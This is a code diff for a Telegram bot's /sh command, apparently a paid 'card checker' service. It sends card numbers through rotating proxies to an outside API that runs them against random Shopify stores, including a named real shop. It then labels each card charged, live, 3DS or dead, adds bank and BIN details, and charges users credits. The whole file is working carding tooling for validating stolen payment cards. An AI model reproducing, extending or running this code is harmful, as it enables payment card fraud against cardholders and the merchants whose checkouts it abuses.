@@ -3,7 +3,7 @@ import asyncio
 import time
 import random
 from html import escape
-from telegram import Update
+from telegram import Update, LinkPreviewOptions
 from telegram.ext import CommandHandler, ContextTypes
 from config import (
     get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT,
@@ -19,16 +19,36 @@ from config import (
 # Proxies loaded from px.txt (one proxy per line).
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-GOSHOPI_URL = "https://goshopi.up.railway.app/shopii"
+GOSHOPI_URL   = "https://goshopi.up.railway.app/shopii"
 FALLBACK_SITE = "aloracosmetics.myshopify.com"
 
-# Emoji IDs used in verdict status lines
-_CHARGED_EMOJI_ID = "5427168083074628963"   # 💎 charged
-_LIVE_EMOJI_ID    = "5427168083074628963"   # ✅ live (reuse charged green)
-_TDS_EMOJI_ID     = "5427168083074628963"   # ✅ 3DS (counted as live)
-_DEAD_EMOJI_ID    = DECLINED_EMOJI_ID        # ❌ dead / declined
-_ERROR_EMOJI_ID   = DECLINED_EMOJI_ID        # ⚠️ error / retry
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# EMOJI IDs — taken verbatim from msh.py
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
+LIVE_EMOJI_ID          = "4958610528588008305"
+PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
+PROG_ERRORS_EMOJI_ID   = "4956611513369494230"
+
+# Pool of charged emoji IDs — a random one is shown per charged hit (from msh.py)
+CHARGED_EMOJI_IDS = [
+    "5801154993188770160", "4956739572114392015", "5285221724634239278",
+    "5287777298894835685", "5285024405246725814", "5287547831677112267",
+    "5287658362660474522", "5285186510197381130", "5803233241963959320",
+    "5462902520215002477", "5787435351521889877", "5323674506705785412",
+    "5801005158959683238", "5436143465211640305", "5800688138833629633",
+    "5891044423856296980", "5436068999068662274", "5427168083074628963",
+]
+
+
+def get_random_charged_emoji() -> str:
+    """Return a random emoji ID from the charged pool (mirrors msh.py)."""
+    return random.choice(CHARGED_EMOJI_IDS)
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# SITE / PROXY LOADERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def load_sites() -> list:
     """Load target Shopify sites from sites.txt (full URLs or bare domains)."""
@@ -61,18 +81,17 @@ def _clean_site(url: str) -> str:
 
 
 def _readable_resp(data: dict) -> str:
-    """Extract the most meaningful field from the API response dict."""
-    for key in ("value", "message", "Response", "response", "category", "status", "detail", "error"):
+    """Extract the most meaningful response field from the API JSON dict."""
+    for key in ("Response", "response", "value", "message", "category", "status", "detail", "error"):
         val = data.get(key)
         if val and str(val).strip() not in ("", "null", "None"):
             return str(val).strip()
-    # fallback: dump the whole dict (truncated)
     raw = str(data)
     return raw[:200] if len(raw) > 200 else raw
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CLASSIFICATION  — copied from msh.py, shared keyword lists
+# RETRY / DECLINED KEYWORD LISTS — copied verbatim from msh.py
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 RETRY_ERRORS = [
@@ -118,7 +137,8 @@ DECLINED_RESPONSES = [
 def classify_response(message: str) -> str:
     """
     Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR.
-    Mirrors the classification used in msh.py exactly.
+    Copied verbatim from msh.py — 3DS_REQUIRED / INCORRECT_CVV /
+    INSUFFICIENT_FUNDS all count as Live.
     """
     mu = message.upper()
     ml = message.lower()
@@ -127,45 +147,53 @@ def classify_response(message: str) -> str:
     if "ORDER_PAID" in mu or "CHARGED" in mu:
         return "CHARGED"
 
-    # 3DS — counted under Live
+    # 3DS — counted under Live, tracked separately
     if "3DS_REQUIRED" in mu:
         return "TDS"
 
-    # Strong live signals
+    # Live hits: INSUFFICIENT_FUNDS / INCORRECT_CVV / INCORRECT_CVC / INCORRECT_ZIP
     if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
             or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu):
         return "LIVE"
 
-    # Dead signals
     if "GENERIC_ERROR" in mu:
         return "DEAD"
 
     if any(d.upper() in mu for d in DECLINED_RESPONSES):
         return "DEAD"
 
-    # Site / proxy / infra errors — treat as retry/error (refund credit)
+    # Retry / site errors — credit is refunded by caller
     if any(r.lower() in ml for r in RETRY_ERRORS):
         return "RETRY"
 
     return "ERROR"
 
 
-async def call_shopii(session: aiohttp.ClientSession, card: str, site: str, proxy: str | None) -> dict:
-    """Call the goshopi API and return the parsed JSON (or error dict)."""
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# API CALL
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def call_shopii(
+    session: aiohttp.ClientSession, card: str, site: str, proxy: str | None
+) -> dict:
+    """Call the goshopi API and return the full parsed JSON dict (or an error dict)."""
     params: dict = {"cc": card, "site": site}
     if proxy:
         params["proxy"] = proxy
     try:
-        async with session.get(GOSHOPI_URL, params=params, timeout=aiohttp.ClientTimeout(total=API_TIMEOUT)) as resp:
+        async with session.get(
+            GOSHOPI_URL, params=params,
+            timeout=aiohttp.ClientTimeout(total=API_TIMEOUT)
+        ) as resp:
             try:
                 return await resp.json(content_type=None)
             except Exception:
                 raw = await resp.text()
-                return {"value": raw, "_raw_text": True}
+                return {"Response": raw, "_raw_text": True}
     except asyncio.TimeoutError:
         raise
     except Exception as e:
-        return {"value": f"CONNECTION_ERROR: {e}", "_error": True}
+        return {"Response": f"CONNECTION_ERROR: {e}", "_error": True}
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -202,7 +230,6 @@ async def _check_force_sub(user_id: int, context) -> list:
     not_joined = []
     for name, link in FORCE_CHANNELS:
         try:
-            from telegram.error import BadRequest, Forbidden
             member = await context.bot.get_chat_member(f"@{name}", user_id)
             if member.status in ("left", "kicked", "restricted"):
                 not_joined.append((name, link))
@@ -261,7 +288,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # ── Credits / cooldown ──────────────────────────────
-    ud = _get_user_data(user.id, context)
+    ud      = _get_user_data(user.id, context)
     premium = _is_premium(ud)
 
     if not premium:
@@ -274,8 +301,8 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         cooldown_store = context.bot_data.setdefault("cooldown_store", {})
-        last_check = cooldown_store.get(user.id, 0)
-        remaining = 25 - (time.time() - last_check)
+        last_check     = cooldown_store.get(user.id, 0)
+        remaining      = 25 - (time.time() - last_check)
         if remaining > 0:
             await update.message.reply_text(
                 f"<b>⏳ Cooldown</b>\n──────────\nWait <b>{remaining:.1f}s</b> before your next check.\n──────────",
@@ -286,21 +313,23 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ud["credits"] = ud.get("credits", 1) - 1
 
     # ── Pick site and proxy ─────────────────────────────
-    sites = load_sites()
-    proxies = load_proxies()
-    raw_site = random.choice(sites)
+    sites      = load_sites()
+    proxies    = load_proxies()
+    raw_site   = random.choice(sites)
     clean_site = _clean_site(raw_site)
-    proxy = random.choice(proxies) if proxies else None
+    proxy      = random.choice(proxies) if proxies else None
 
     bin_num = card_raw.replace("|", "").replace(" ", "")[:6]
 
     msg = await update.message.reply_text(
         f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> '
-        f'Checking Shopify...</b>', parse_mode="HTML"
+        f'Checking Shopify...</b>',
+        parse_mode="HTML"
     )
     start_time = time.time()
-    uname = f"@{user.username}" if user.username else user.first_name or "User"
-    plan = ud.get("plan", "TRIAL")
+    uname      = f"@{user.username}" if user.username else user.first_name or "User"
+    plan       = ud.get("plan", "TRIAL")
+    _lp        = LinkPreviewOptions(is_disabled=True)
 
     try:
         timeout = aiohttp.ClientTimeout(total=API_TIMEOUT)
@@ -314,125 +343,155 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if isinstance(data, BaseException):
             raise data
         if isinstance(bin_data, BaseException):
-            bin_data = {"error": True}
+            bin_data = {}
 
-        resp_text = _readable_resp(data if isinstance(data, dict) else {})
-        verdict   = classify_response(resp_text)
+        # ── Extract all important fields from the API response ──
+        if not isinstance(data, dict):
+            data = {}
 
-        # ── Build status line ──────────────────────────
+        resp_text    = _readable_resp(data)
+        api_price    = str(data.get("Price",    data.get("price",    "0.00"))).strip()
+        api_currency = str(data.get("Currency", data.get("currency", "USD"))).strip()
+        api_gateway  = str(data.get("Gateway",  data.get("gateway",  "Shopify Payments"))).strip()
+
+        verdict = classify_response(resp_text)
+
+        # ── BIN info line ───────────────────────────────
+        bin_txt = "N/A"
+        if isinstance(bin_data, dict) and bin_data:
+            scheme  = str(bin_data.get("scheme",  "N/A")).upper()
+            bank    = bin_data.get("bank",    "N/A")
+            country = str(bin_data.get("country", "N/A")).upper()
+            flag    = bin_data.get("country_emoji", "")
+            bin_txt = f"{scheme} - {bank} - {flag} {country}".strip(" -")
+
+        time_taken = f"{time.time() - start_time:.2f}"
+
+        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        # VERDICT → STATUS LINE + FULL MESSAGE
+        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
         if verdict == "CHARGED":
+            # Random emoji from pool — same as msh.py
+            charged_eid = get_random_charged_emoji()
             status_line = (
                 f'<b><a href="{CHANNEL_LINK}">[❆]</a> Charged '
-                f'<tg-emoji emoji-id="{_CHARGED_EMOJI_ID}">💎</tg-emoji></b>'
+                f'<tg-emoji emoji-id="{charged_eid}">💎</tg-emoji></b>'
             )
+            # Show price + currency prominently for charged cards
+            gate_line = (
+                f'<b>Gᴀᴛᴇ ➺ {escape(api_gateway)} | '
+                f'{escape(api_price)} {escape(api_currency)}</b>'
+            )
+            ud["approved_checks"] = ud.get("approved_checks", 0) + 1
+
         elif verdict == "TDS":
             status_line = (
                 f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
-                f'<tg-emoji emoji-id="{_TDS_EMOJI_ID}">✅</tg-emoji> '
-                f'[3DS]</b>'
+                f'<tg-emoji emoji-id="{LIVE_EMOJI_ID}">✅</tg-emoji> [3DS]</b>'
             )
+            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
+            ud["approved_checks"] = ud.get("approved_checks", 0) + 1
+
         elif verdict == "LIVE":
             status_line = (
                 f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
-                f'<tg-emoji emoji-id="{_LIVE_EMOJI_ID}">✅</tg-emoji></b>'
+                f'<tg-emoji emoji-id="{LIVE_EMOJI_ID}">✅</tg-emoji></b>'
             )
+            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
+            ud["approved_checks"] = ud.get("approved_checks", 0) + 1
+
         elif verdict == "DEAD":
             status_line = (
                 f'<b><a href="{CHANNEL_LINK}">[❆]</a> Dead '
-                f'<tg-emoji emoji-id="{_DEAD_EMOJI_ID}">❌</tg-emoji></b>'
+                f'<tg-emoji emoji-id="{DECLINED_EMOJI_ID}">❌</tg-emoji></b>'
             )
+            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
+            ud["declined_checks"] = ud.get("declined_checks", 0) + 1
+
         elif verdict == "RETRY":
-            # Site/proxy error — refund the credit we deducted
+            # Site / proxy error — refund credit
             if not premium:
                 ud["credits"] = ud.get("credits", 0) + 1
             status_line = (
                 f'<b><a href="{CHANNEL_LINK}">[❆]</a> Retry '
-                f'<tg-emoji emoji-id="{_ERROR_EMOJI_ID}">⚠️</tg-emoji></b>'
+                f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>'
             )
+            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
+            ud["declined_checks"] = ud.get("declined_checks", 0) + 1
+
         else:  # ERROR
-            # Unknown error — refund credit
+            # Unknown response — refund credit
             if not premium:
                 ud["credits"] = ud.get("credits", 0) + 1
             status_line = (
                 f'<b><a href="{CHANNEL_LINK}">[❆]</a> Error '
-                f'<tg-emoji emoji-id="{_ERROR_EMOJI_ID}">⚠️</tg-emoji></b>'
+                f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>'
             )
+            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
+            ud["declined_checks"] = ud.get("declined_checks", 0) + 1
 
-        # ── BIN info ───────────────────────────────────
-        bin_txt = "N/A"
-        if isinstance(bin_data, dict) and not bin_data.get("error"):
-            scheme  = str(bin_data.get("scheme", "N/A")).upper()
-            bank    = bin_data.get("bank", "N/A")
-            country = str(bin_data.get("country", "N/A")).upper()
-            flag    = bin_data.get("country_emoji", "")
-            bin_txt = f"{scheme} - {bank} - {flag} {country}".strip("- ")
-
-        time_taken = f"{time.time() - start_time:.2f}"
-
+        # ── Full result message ─────────────────────────
         text = (
             f"{status_line}\n"
-            f'<b>━━━━━━━━━━━━━━━━━</b>\n'
-            f'<b>💳 <code>{escape(card_raw)}</code></b>\n'
-            f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>\n'
-            f'<b>Rᴀᴡ  ➺ {escape(resp_text)}</b>\n'
-            f'<b>Iɴꜰᴏ ➺ {bin_txt}</b>\n'
-            f'<b>━━━━━━━━━━━━━━━━━</b>\n'
-            f'<b>⏱ {time_taken}s</b>\n'
-            f'<b>👤 {escape(uname)}</b>\n'
-            f'<b>⚡ Batman ⭐</b>\n'
-            f'<b>━━━━━━━━━━━━━━━━━</b>\n'
+            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
+            f"<b>💳 <code>{escape(card_raw)}</code></b>\n"
+            f"{gate_line}\n"
+            f"<b>Rᴀᴡ  ➺ {escape(resp_text)}</b>\n"
+            f"<b>Iɴꜰᴏ ➺ {bin_txt}</b>\n"
+            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
+            f"<b>⏱ {time_taken}s</b>\n"
+            f"<b>👤 {escape(uname)}</b>\n"
+            f"<b>⚡ Batman ⭐</b>\n"
+            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
             f'<b>📢 <a href="{CHANNEL_LINK}">@Batcardchk</a></b>'
         )
 
-        # ── Update stats ───────────────────────────────
+        # ── Update user stats ───────────────────────────
         ud["total_checks"] = ud.get("total_checks", 0) + 1
         ud["last_gate"]    = "Shopify | 0$"
         ud["last_card"]    = card_raw[:6] + "xxxxxxxxxx"
-        if verdict in ("CHARGED", "TDS", "LIVE"):
-            ud["approved_checks"] = ud.get("approved_checks", 0) + 1
-        else:
-            ud["declined_checks"] = ud.get("declined_checks", 0) + 1
 
-        from telegram import LinkPreviewOptions
-        _lp = LinkPreviewOptions(is_disabled=True)
-        await msg.edit_text(text, parse_mode="HTML",
-                            reply_markup=kb_result(premium),
-                            link_preview_options=_lp)
+        await msg.edit_text(
+            text, parse_mode="HTML",
+            reply_markup=kb_result(premium),
+            link_preview_options=_lp,
+        )
 
     except asyncio.TimeoutError:
         if not premium:
             ud["credits"] = ud.get("credits", 0) + 1
         time_taken = f"{time.time() - start_time:.2f}"
-        from telegram import LinkPreviewOptions
         await msg.edit_text(
             f'<b><a href="{CHANNEL_LINK}">[❆]</a> Timeout '
-            f'<tg-emoji emoji-id="{_ERROR_EMOJI_ID}">⏱</tg-emoji></b>\n\n'
+            f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⏱</tg-emoji></b>\n\n'
             f'<b><code>{escape(card_raw)}</code></b>\n'
             f'<b>Gate ➳ Shopify | 0$</b>\n'
             f'<b>──────────</b>\n'
-            f'<b>RESP ➳ Request Timed Out</b>\n'
+            f'<b>Rᴀᴡ ➳ Request Timed Out</b>\n'
             f'<b>──────────</b>\n'
             f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {time_taken}s</b>',
-            parse_mode="HTML", reply_markup=kb_result(premium),
-            link_preview_options=LinkPreviewOptions(is_disabled=True)
+            parse_mode="HTML",
+            reply_markup=kb_result(premium),
+            link_preview_options=LinkPreviewOptions(is_disabled=True),
         )
 
     except Exception as e:
         if not premium:
             ud["credits"] = ud.get("credits", 0) + 1
         time_taken = f"{time.time() - start_time:.2f}"
-        from telegram import LinkPreviewOptions
         await msg.edit_text(
             f'<b><a href="{CHANNEL_LINK}">[❆]</a> Error '
-            f'<tg-emoji emoji-id="{_ERROR_EMOJI_ID}">⚠️</tg-emoji></b>\n\n'
+            f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n\n'
             f'<b><code>{escape(card_raw)}</code></b>\n'
             f'<b>Gate ➳ Shopify | 0$</b>\n'
             f'<b>──────────</b>\n'
-            f'<b>RESP ➳ {escape(str(e)[:150])}</b>\n'
+            f'<b>Rᴀᴡ ➳ {escape(str(e)[:150])}</b>\n'
             f'<b>──────────</b>\n'
             f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {time_taken}s</b>',
-            parse_mode="HTML", reply_markup=kb_result(premium),
-            link_preview_options=LinkPreviewOptions(is_disabled=True)
+            parse_mode="HTML",
+            reply_markup=kb_result(premium),
+            link_preview_options=LinkPreviewOptions(is_disabled=True),
         )
 
 
